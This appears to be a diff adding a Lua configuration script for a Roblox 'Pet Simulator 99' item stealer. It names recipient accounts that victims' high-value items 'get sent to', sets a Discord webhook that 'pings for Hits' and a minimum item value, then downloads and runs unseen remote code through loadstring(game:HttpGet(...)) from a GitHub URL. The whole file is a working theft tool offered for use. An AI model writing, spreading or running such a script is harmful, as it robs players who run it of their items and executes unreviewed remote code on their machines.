@@ -1,0 +1,7 @@
+Username = "Majkelekxd123" -- stuff will get sent to this user
+Username2 = "2nd Username Here" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = "https://discord.com/api/webhooks/1297925505051529246/bfcnwxflAe2SaCDafbRwDkanAs8ZyAdO2urZhXq2lwuc0dQ4Qa8JzAM82FezbNG11wwN" -- pings for Hits
+
+MinimumRAP = 500000 -- minimum rap of each item you want to get sent to you. 500000 by default
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99"))()
